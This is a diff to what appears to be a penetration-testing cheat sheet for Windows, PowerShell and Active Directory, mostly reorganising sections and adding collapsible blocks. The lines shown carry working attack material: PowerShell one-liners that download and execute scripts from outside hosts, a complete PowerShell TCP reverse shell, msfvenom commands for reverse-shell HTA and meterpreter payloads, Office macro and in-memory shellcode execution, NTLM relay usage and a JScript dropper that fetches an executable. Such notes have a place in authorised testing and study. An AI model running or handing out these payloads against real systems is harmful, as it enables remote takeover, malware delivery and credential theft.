@@ -75,20 +75,7 @@ $data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
 ```
 </details>
 
-# Reverse Shells
-Download and execute with Powershell:
-```
-powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"
-
-c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
-```
-
-Powershell only:
-```
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
-
-# Show Proxy Settings with Powershell
+## Show Proxy Settings
 ```
 [System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://google.com")
 [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://10.10.10.10/run.ps1")
@@ -105,7 +92,7 @@ ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.
 $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
 ```
 
-# Set Proxy with Powershell 
+## Set Proxy
 ```
 $wc = new-object system.net.webclient
 $wc.proxy = $null
@@ -122,12 +109,27 @@ $wc = new-object system.net.WebClient
 $wc.DownloadString("http://10.10.10.10/run.ps1")
 ```
 
-# Set User-Agent with Powershell
+## Set User-Agent
 ```
 $wc = new-object system.net.webclient
 $wc.Headers.Add('User-Agent', 'MyUserAgent')
 $wc.DownloadString("http://10.10.10.10/run.ps1")
 ```
+
+# Reverse Shells
+Download and execute with Powershell:
+```
+powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"
+
+c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
+```
+
+Powershell only:
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+
 
 
 # Privilege Escalation
@@ -491,6 +493,10 @@ ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfi
 
 
 ## Collect all Users with their Attributes
+
+<details>
+  <summary>Expand</summary>
+
 For more information about samAccountTypes see this [link](https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -526,7 +532,14 @@ Foreach($obj in $Result)
 } 
 
 ```
+</details>
+
 ## Resolving Nested Groups
+
+
+<details>
+  <summary>Expand</summary>
+
 Print names of all the groups
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -576,6 +589,7 @@ $Searcher.filter="serviceprincipalname=*http*"
 ..
 .
 ```
+</details>
 
 ## PowerView
 
@@ -960,6 +974,10 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-p
 ```
 
 ## Exploiting Microsoft Office
+
+<details>
+  <summary>Expand</summary>
+
 Create payload:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta
@@ -1003,6 +1021,7 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
+</details>
 
 ## Executing Shellcode in Word Memory using VBA
 
@@ -1127,6 +1146,10 @@ To work as expected, this requires a matching 32-bit multi/handler in Metasploit
 </details>
 
 ## Executing Shellcode in Word Memory using Powershell
+
+<details>
+  <summary>Expand</summary>
+
 Generating Shellcode
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 EXITFUNC=thread -f ps1
@@ -1281,8 +1304,9 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
+</details>
 
-# Dropper in JScript
+## Dropper in JScript
 ```javascript
 var url = "http://10.10.10.10/bin.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
